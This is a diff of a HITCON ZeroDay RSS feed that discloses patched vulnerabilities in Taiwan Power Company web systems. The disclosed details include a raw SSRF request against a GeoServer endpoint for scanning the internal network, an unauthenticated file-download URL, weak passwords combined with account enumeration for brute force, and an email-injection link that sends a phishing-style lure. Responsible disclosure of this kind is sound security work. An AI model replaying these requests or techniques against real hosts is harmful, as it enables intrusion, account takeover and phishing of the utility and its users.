@@ -2966,7 +2966,7 @@
   </div>
  </section>
 </div>
-</description><pubDate>Mon, 15 Aug 2022 17:11:24 GMT</pubDate></item><item><title>[Bounty]  某單位  SSRF</title><link>https://zeroday.hitcon.org/vulnerability/ZD-2022-00657</link><description><div class="container">
+</description><pubDate>Mon, 15 Aug 2022 17:11:24 GMT</pubDate></item><item><title>[Bounty] 台灣電力公司 SSRF</title><link>https://zeroday.hitcon.org/vulnerability/ZD-2022-00657</link><description><div class="container">
  <h2 class="always-not-there">
   Vulnerability Detail Report
  </h2>
@@ -2984,12 +2984,25 @@
       ZD-2022-00657
      </span>
     </li>
+    <li class="vendor">
+     <a class="zdui-button send-message okgo" href="/up/message/channel/create/vendor/2577">
+      <i class="far fa-envelope">
+      </i>
+      發信
+     </a>
+     <span class="label">
+      Vendor:
+     </span>
+     <span class="value tx-overflow-ellipsis">
+      台灣電力公司
+     </span>
+    </li>
     <li class="title">
      <span class="label">
       Title:
      </span>
      <span class="value">
-      [Bounty]  某單位  SSRF
+      [Bounty] 台灣電力公司 SSRF
      </span>
     </li>
     <li class="intro">
@@ -3012,10 +3025,10 @@
     目前狀態
    </h4>
    <div class="status-label col-status-200-tx">
-    確認已修補
+    公開
    </div>
    <div class="status-descr">
-    Last Update : 2022/08/24
+    Last Update : 2022/08/28
    </div>
    <ul class="zdui-status-timeline stat-tn-risk-medium">
     <li class="">
@@ -3054,7 +3067,7 @@
       </span>
      </div>
     </li>
-    <li class="just-arrived">
+    <li class="">
      <div class="stat-tn-node">
       <span class="stat-tn-date">
       </span>
@@ -3063,7 +3076,7 @@
       </span>
      </div>
     </li>
-    <li class="not-arrived-yet">
+    <li class="just-arrived">
      <div class="stat-tn-node">
       <span class="stat-tn-date">
       </span>
@@ -3134,6 +3147,17 @@
       確認已修補 (由 ccoozzyy 更新此狀態)
      </span>
     </li>
+    <li>
+     <span class="log-date">
+      2022/08/28 03:00:05
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      公開 (由 HITCON ZeroDay 平台自動更新)
+     </span>
+    </li>
    </ul>
   </div>
  </section>
@@ -3162,6 +3186,109 @@
    </ul>
   </div>
  </section>
+ <section class="vul-detail-section vu-d-url">
+  <h3 class="sec-title">
+   參考資料
+  </h3>
+  <div class="section-content url">
+   <div>
+    暫無資料
+   </div>
+   <div align="right" class="section-content url" style="color: grey; margin-top: 20px">
+    (本欄位資訊由系統根據漏洞類別自動產生，做為漏洞參考資料。)
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section vu-d-url">
+  <h3 class="sec-title">
+   相關網址
+  </h3>
+  <div class="section-content url">
+   <div class="urls">
+    https://hcweb.taipower.com.tw/ltflgeoserver/TestWfsPost
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   敘述
+  </h3>
+  <div class="section-content zdui-md-content" id="detail">
+   <div>
+    <p>
+     Step1. 瀏覽
+     <a href="https://hcweb.taipower.com.tw/ltflgeoserver/web/">
+      https://hcweb.taipower.com.tw/ltflgeoserver/web/
+     </a>
+     ，可看到 GeoServer 版本為 2.9.3.x，該版本存在已知 SSRF 漏洞，漏洞編號為 CVE-2021-40822
+    </p>
+    <p>
+     Step2. 送出下列封包，可列舉內網 IP，例如 10.21.1.0/24 網段
+    </p>
+    <pre><code>POST /ltflgeoserver/TestWfsPost HTTP/1.1
+Host: 10.21.1.82
+User-Agent: User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Dnt: 1
+Upgrade-Insecure-Requests: 1
+Te: trailers
+Connection: close
+Content-Length: 77
+Content-Type: application/x-www-form-urlencoded
+
+form_hf_0=&amp;url=http://10.21.1.82/ltflgeoserver/../&amp;body=&amp;username=&amp;password=</code></pre>
+    <p>
+     <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7820/attachments/390a468ae56118baa8c70534a20fc9c9"/>
+     <br/>
+     <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7820/attachments/808ef5c113236713bab928e13bd3526f"/>
+    </p>
+    <p>
+     Step3. 掃描 hcweb.taipower.com.tw 本機連接埠
+     <br/>
+     <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7820/attachments/eb627f5add7aad0e8e8278b01a2a49eb"/>
+    </p>
+    <p>
+     影響：攻擊者可以在內網尋找可進一步利用的漏洞進行攻擊。
+    </p>
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   修補建議
+  </h3>
+  <div class="section-content zdui-md-content">
+   <p>
+    更新 GeoServer 至最新版本。
+   </p>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   擷圖
+  </h3>
+  <div class="section-content screenshot">
+   <ul>
+    <li>
+     <span>
+      <img src="/api/vulnerability/7820/attachments/390a468ae56118baa8c70534a20fc9c9" width="320"/>
+     </span>
+    </li>
+    <li>
+     <span>
+      <img src="/api/vulnerability/7820/attachments/808ef5c113236713bab928e13bd3526f" width="320"/>
+     </span>
+    </li>
+    <li>
+     <span>
+      <img src="/api/vulnerability/7820/attachments/eb627f5add7aad0e8e8278b01a2a49eb" width="320"/>
+     </span>
+    </li>
+   </ul>
+  </div>
+ </section>
  <section class="vul-detail-section vu-d-cmnt">
   <h3 class="sec-title">
    留言討論
@@ -3174,6 +3301,25 @@
      <a href="/auth/login">
       登入後留言
      </a>
+    </div>
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section vu-d-cmnt">
+  <h3 class="sec-title">
+   聯絡組織
+  </h3>
+  <div class="section-content">
+   <div class="zdui-comment-block">
+    <div class="input-comment">
+     <a class="zdui-button okgo" href="/up/message/channel/create/vendor/2577">
+      <i class="far fa-envelope">
+      </i>
+      發送私人訊息
+     </a>
+     <div class="remind-text">
+      您也可以透過私人訊息的方式與組織聯繫，討論有關於這個漏洞的相關資訊。
+     </div>
     </div>
    </div>
   </div>
@@ -3539,7 +3685,7 @@
   </div>
  </section>
 </div>
-</description><pubDate>Mon, 15 Aug 2022 14:52:48 GMT</pubDate></item><item><title>[Bounty]  某單位 </title><link>https://zeroday.hitcon.org/vulnerability/ZD-2022-00654</link><description><div class="container">
+</description><pubDate>Mon, 15 Aug 2022 14:52:48 GMT</pubDate></item><item><title>[Bounty]  公用售電業電力排碳係數申報管理系統 存取控制缺陷</title><link>https://zeroday.hitcon.org/vulnerability/ZD-2022-00654</link><description><div class="container">
  <h2 class="always-not-there">
   Vulnerability Detail Report
  </h2>
@@ -3557,12 +3703,25 @@
       ZD-2022-00654
      </span>
     </li>
+    <li class="vendor">
+     <a class="zdui-button send-message okgo" href="/up/message/channel/create/vendor/2577">
+      <i class="far fa-envelope">
+      </i>
+      發信
+     </a>
+     <span class="label">
+      Vendor:
+     </span>
+     <span class="value tx-overflow-ellipsis">
+      台灣電力公司
+     </span>
+    </li>
     <li class="title">
      <span class="label">
       Title:
      </span>
      <span class="value">
-      [Bounty]  某單位
+      [Bounty]  公用售電業電力排碳係數申報管理系統 存取控制缺陷
      </span>
     </li>
     <li class="intro">
@@ -3585,10 +3744,10 @@
     目前狀態
    </h4>
    <div class="status-label col-status-200-tx">
-    確認已修補
+    公開
    </div>
    <div class="status-descr">
-    Last Update : 2022/08/24
+    Last Update : 2022/08/28
    </div>
    <ul class="zdui-status-timeline stat-tn-risk-high">
     <li class="">
@@ -3627,7 +3786,7 @@
       </span>
      </div>
     </li>
-    <li class="just-arrived">
+    <li class="">
      <div class="stat-tn-node">
       <span class="stat-tn-date">
       </span>
@@ -3636,7 +3795,7 @@
       </span>
      </div>
     </li>
-    <li class="not-arrived-yet">
+    <li class="just-arrived">
      <div class="stat-tn-node">
       <span class="stat-tn-date">
       </span>
@@ -3762,6 +3921,17 @@
       確認已修補 (由 Vancero 更新此狀態)
      </span>
     </li>
+    <li>
+     <span class="log-date">
+      2022/08/28 03:00:04
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      公開 (由 HITCON ZeroDay 平台自動更新)
+     </span>
+    </li>
    </ul>
   </div>
  </section>
@@ -3790,6 +3960,105 @@
    </ul>
   </div>
  </section>
+ <section class="vul-detail-section vu-d-url">
+  <h3 class="sec-title">
+   參考資料
+  </h3>
+  <div class="section-content url">
+   <div>
+    攻擊者可經由該漏洞取得、修改、刪除系統中的其他使用者的資料，或連線至高權限使用者的頁面。
+    <br/>
+    <br/>
+    OWASP Top 10 - 2017 A5 - Broken Access Control
+    <br/>
+    https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control
+    <br/>
+    <br/>
+    CWE-284: Improper Access Control
+    <br/>
+    https://cwe.mitre.org/data/definitions/284.html
+   </div>
+   <div align="right" class="section-content url" style="color: grey; margin-top: 20px">
+    (本欄位資訊由系統根據漏洞類別自動產生，做為漏洞參考資料。)
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section vu-d-url">
+  <h3 class="sec-title">
+   相關網址
+  </h3>
+  <div class="section-content url">
+   <div class="urls">
+    https://eecms.taipower.com.tw/
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   敘述
+  </h3>
+  <div class="section-content zdui-md-content" id="detail">
+   <div>
+    <p>
+     透過「ZD-2022-00558」公開的資料發現有上傳測試用的PDF檔案但卻可以透過直接連結進行下載沒有經過身分驗證。
+     <br/>
+     <a href="https://eecms.taipower.com.tw/ashx/AttorneyLetter.ashx?UNO=Ow0OaitsQ8PDN%2FqBOh5Y6Q%3D%3D">
+      https://eecms.taipower.com.tw/ashx/AttorneyLetter.ashx?UNO=Ow0OaitsQ8PDN%2fqBOh5Y6Q%3d%3d
+     </a>
+     <br/>
+     <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7817/attachments/eae0bde2f5f7c0a51932ca67f7619d3a"/>
+     <br/>
+     <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7817/attachments/4554eb8ab2d344279a6e4664928e1a43"/>
+    </p>
+    <p>
+     同樣的手法透過「ZD-2022-00653」取得管理頁面路徑後也可以下載不同區資料檔案，也是沒有經過身分驗證。
+     <br/>
+     <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7817/attachments/3bc8035789fdaee1473d149ca3ebe5b7"/>
+     <br/>
+     <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7817/attachments/dc8eaa7135bc353f619f84322325d149"/>
+    </p>
+    <p>
+     如果檔案路徑真實存在，但不在這個資料夾下則會洩漏路徑。
+     <br/>
+     <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7817/attachments/76a53b8e03b5b4c3993a7b5bffa06570"/>
+    </p>
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   擷圖
+  </h3>
+  <div class="section-content screenshot">
+   <ul>
+    <li>
+     <span>
+      <img src="/api/vulnerability/7817/attachments/eae0bde2f5f7c0a51932ca67f7619d3a" width="320"/>
+     </span>
+    </li>
+    <li>
+     <span>
+      <img src="/api/vulnerability/7817/attachments/4554eb8ab2d344279a6e4664928e1a43" width="320"/>
+     </span>
+    </li>
+    <li>
+     <span>
+      <img src="/api/vulnerability/7817/attachments/3bc8035789fdaee1473d149ca3ebe5b7" width="320"/>
+     </span>
+    </li>
+    <li>
+     <span>
+      <img src="/api/vulnerability/7817/attachments/dc8eaa7135bc353f619f84322325d149" width="320"/>
+     </span>
+    </li>
+    <li>
+     <span>
+      <img src="/api/vulnerability/7817/attachments/76a53b8e03b5b4c3993a7b5bffa06570" width="320"/>
+     </span>
+    </li>
+   </ul>
+  </div>
+ </section>
  <section class="vul-detail-section vu-d-cmnt">
   <h3 class="sec-title">
    留言討論
@@ -3806,8 +4075,27 @@
    </div>
   </div>
  </section>
+ <section class="vul-detail-section vu-d-cmnt">
+  <h3 class="sec-title">
+   聯絡組織
+  </h3>
+  <div class="section-content">
+   <div class="zdui-comment-block">
+    <div class="input-comment">
+     <a class="zdui-button okgo" href="/up/message/channel/create/vendor/2577">
+      <i class="far fa-envelope">
+      </i>
+      發送私人訊息
+     </a>
+     <div class="remind-text">
+      您也可以透過私人訊息的方式與組織聯繫，討論有關於這個漏洞的相關資訊。
+     </div>
+    </div>
+   </div>
+  </div>
+ </section>
 </div>
-</description><pubDate>Sun, 14 Aug 2022 22:58:58 GMT</pubDate></item><item><title>[Bounty]  某單位 </title><link>https://zeroday.hitcon.org/vulnerability/ZD-2022-00653</link><description><div class="container">
+</description><pubDate>Sun, 14 Aug 2022 22:58:58 GMT</pubDate></item><item><title>[Bounty]  公用售電業電力排碳係數申報管理系統 弱密碼</title><link>https://zeroday.hitcon.org/vulnerability/ZD-2022-00653</link><description><div class="container">
  <h2 class="always-not-there">
   Vulnerability Detail Report
  </h2>
@@ -3825,12 +4113,25 @@
       ZD-2022-00653
      </span>
     </li>
+    <li class="vendor">
+     <a class="zdui-button send-message okgo" href="/up/message/channel/create/vendor/2577">
+      <i class="far fa-envelope">
+      </i>
+      發信
+     </a>
+     <span class="label">
+      Vendor:
+     </span>
+     <span class="value tx-overflow-ellipsis">
+      台灣電力公司
+     </span>
+    </li>
     <li class="title">
      <span class="label">
       Title:
      </span>
      <span class="value">
-      [Bounty]  某單位
+      [Bounty]  公用售電業電力排碳係數申報管理系統 弱密碼
      </span>
     </li>
     <li class="intro">
@@ -3853,10 +4154,10 @@
     目前狀態
    </h4>
    <div class="status-label col-status-200-tx">
-    確認已修補
+    公開
    </div>
    <div class="status-descr">
-    Last Update : 2022/08/24
+    Last Update : 2022/08/28
    </div>
    <ul class="zdui-status-timeline stat-tn-risk-medium">
     <li class="">
@@ -3895,7 +4196,7 @@
       </span>
      </div>
     </li>
-    <li class="just-arrived">
+    <li class="">
      <div class="stat-tn-node">
       <span class="stat-tn-date">
       </span>
@@ -3904,7 +4205,7 @@
       </span>
      </div>
     </li>
-    <li class="not-arrived-yet">
+    <li class="just-arrived">
      <div class="stat-tn-node">
       <span class="stat-tn-date">
       </span>
@@ -3986,6 +4287,17 @@
       確認已修補 (由 Vancero 更新此狀態)
      </span>
     </li>
+    <li>
+     <span class="log-date">
+      2022/08/28 03:00:02
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      公開 (由 HITCON ZeroDay 平台自動更新)
+     </span>
+    </li>
    </ul>
   </div>
  </section>
@@ -4014,6 +4326,99 @@
    </ul>
   </div>
  </section>
+ <section class="vul-detail-section vu-d-url">
+  <h3 class="sec-title">
+   參考資料
+  </h3>
+  <div class="section-content url">
+   <div>
+    使用預設密碼或過於簡單之密碼，可經由該問題取得後台完整權限，且容易造成大量資訊外洩。
+    <br/>
+    <br/>
+    OWASP Top 10 - 2017 A2 - Broken_Authentication
+    <br/>
+    https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication
+    <br/>
+    <br/>
+    CWE-521: Weak Password Requirements
+    <br/>
+    https://cwe.mitre.org/data/definitions/521.html
+    <br/>
+    <br/>
+    HOW SECURE IS MY PASSWORD?
+    <br/>
+    https://howsecureismypassword.net/
+   </div>
+   <div align="right" class="section-content url" style="color: grey; margin-top: 20px">
+    (本欄位資訊由系統根據漏洞類別自動產生，做為漏洞參考資料。)
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section vu-d-url">
+  <h3 class="sec-title">
+   相關網址
+  </h3>
+  <div class="section-content url">
+   <div class="urls">
+    https://eecms.taipower.com.tw/
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   敘述
+  </h3>
+  <div class="section-content zdui-md-content" id="detail">
+   <div>
+    <p>
+     帳號為統一編號網路上可查公開資料，經過測試發現多處電廠的密碼同時也是帳號統編，建議台電檢視使用這套系統的發電廠。
+     <br/>
+     <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7816/attachments/29643b9ed07f8d400a030c959707943e"/>
+     <br/>
+     <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7816/attachments/16e8ea69e5ef4f1e4e21cbfad526b59e"/>
+    </p>
+    <p>
+     系統在申請時有說要8位數以上英數混合，管理頁面更改密碼更是嚴格，但似乎都沒有檢查密碼的強度。
+     <br/>
+     <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7816/attachments/111aa625591d9b6b7ce1a593fd3ce004"/>
+    </p>
+    <p>
+     暴力破解系統會鎖IP 10分鐘左右，但在註冊那不管「能源產業分類」選什麼都會先檢查統一編號是否已被註冊，並且因為驗證碼是所有資料填完才會檢驗因此不需要填驗證也可以先知道是否已被註冊，可以透過此手法尋找帳號進行暴力破解。
+     <br/>
+     <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7816/attachments/0166e72186e84b9f0759dc9a53c632fc"/>
+    </p>
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   擷圖
+  </h3>
+  <div class="section-content screenshot">
+   <ul>
+    <li>
+     <span>
+      <img src="/api/vulnerability/7816/attachments/29643b9ed07f8d400a030c959707943e" width="320"/>
+     </span>
+    </li>
+    <li>
+     <span>
+      <img src="/api/vulnerability/7816/attachments/16e8ea69e5ef4f1e4e21cbfad526b59e" width="320"/>
+     </span>
+    </li>
+    <li>
+     <span>
+      <img src="/api/vulnerability/7816/attachments/111aa625591d9b6b7ce1a593fd3ce004" width="320"/>
+     </span>
+    </li>
+    <li>
+     <span>
+      <img src="/api/vulnerability/7816/attachments/0166e72186e84b9f0759dc9a53c632fc" width="320"/>
+     </span>
+    </li>
+   </ul>
+  </div>
+ </section>
  <section class="vul-detail-section vu-d-cmnt">
   <h3 class="sec-title">
    留言討論
@@ -4026,6 +4431,25 @@
      <a href="/auth/login">
       登入後留言
      </a>
+    </div>
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section vu-d-cmnt">
+  <h3 class="sec-title">
+   聯絡組織
+  </h3>
+  <div class="section-content">
+   <div class="zdui-comment-block">
+    <div class="input-comment">
+     <a class="zdui-button okgo" href="/up/message/channel/create/vendor/2577">
+      <i class="far fa-envelope">
+      </i>
+      發送私人訊息
+     </a>
+     <div class="remind-text">
+      您也可以透過私人訊息的方式與組織聯繫，討論有關於這個漏洞的相關資訊。
+     </div>
     </div>
    </div>
   </div>
@@ -10991,7 +11415,7 @@
   <div class="section-content url">
    <div class="urls">
     https://greennet.taipower.com.tw/
-    <a class="__cf_email__" data-cfemail="500325323d392323393f3e0f03353e34153d31393c7e312320286f33616d2761686164696610373d31393c7e333f3d" href="/cdn-cgi/l/email-protection">
+    <a class="__cf_email__" data-cfemail="6d3e180f00041e1e040203323e08030928000c0401430c1e1d15520e5c501a5c555c59545b2d0a000c0401430e0200" href="/cdn-cgi/l/email-protection">
      [email protected]
     </a>
     &amp;c2=Bug%20Bounty&amp;c3=VIP%E4%BD%BF%E7%94%A8%E8%80%85%0A%E8%AB%8B%E8%87%B3%20http://kaibro.tw/hack%20%E8%BC%B8%E5%85%A5%E5%B8%B3%E8%99%9F%E5%AF%86%E7%A2%BC%E7%99%BB%E5%85%A5%E4%B8%A6%E9%A0%98%E5%8F%96%E4%BD%A0%E7%9A%84%E7%8D%8E%E5%8B%B5%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A,bb,cc
@@ -11015,7 +11439,7 @@
      <br/>
      <a href="https://greennet.taipower.com.tw/Submission_SendEmail.aspx?c1=kaibrobugbounty@gmail.com&amp;c2=Bug%20Bounty&amp;c3=VIP%E4%BD%BF%E7%94%A8%E8%80%85%0A%E8%AB%8B%E8%87%B3%20http://kaibro.tw/hack%20%E8%BC%B8%E5%85%A5%E5%B8%B3%E8%99%9F%E5%AF%86%E7%A2%BC%E7%99%BB%E5%85%A5%E4%B8%A6%E9%A0%98%E5%8F%96%E4%BD%A0%E7%9A%84%E7%8D%8E%E5%8B%B5%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A,bb,cc">
       https://greennet.taipower.com.tw/
-      <span class="__cf_email__" data-cfemail="5a092f383733292933353405093f343e1f373b3336743b292a2265396b67313b33382835382f3d38352f342e231a3d373b333674393537">
+      <span class="__cf_email__" data-cfemail="efbc9a8d82869c9c868081b0bc8a818baa828e8683c18e9c9f97d08cded2848e868d9d808d9a888d809a819b96af88828e8683c18c8082">
        [email protected]
       </span>
       &amp;c2=Bug%20Bounty&amp;c3=VIP%E4%BD%BF%E7%94%A8%E8%80%85%0A%E8%AB%8B%E8%87%B3%20http://kaibro.tw/hack%20%E8%BC%B8%E5%85%A5%E5%B8%B3%E8%99%9F%E5%AF%86%E7%A2%BC%E7%99%BB%E5%85%A5%E4%B8%A6%E9%A0%98%E5%8F%96%E4%BD%A0%E7%9A%84%E7%8D%8E%E5%8B%B5%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A,bb,cc
@@ -11023,7 +11447,7 @@
     </p>
     <p>
      存取該連結，可以對
-     <a class="__cf_email__" data-cfemail="bdd6dcd4dfcfd2dfc8dadfd2c8d3c9c4fddad0dcd4d193ded2d0" href="/cdn-cgi/l/email-protection">
+     <a class="__cf_email__" data-cfemail="cea5afa7acbca1acbba9aca1bba0bab78ea9a3afa7a2e0ada1a3" href="/cdn-cgi/l/email-protection">
       [email protected]
      </a>
      發送信件
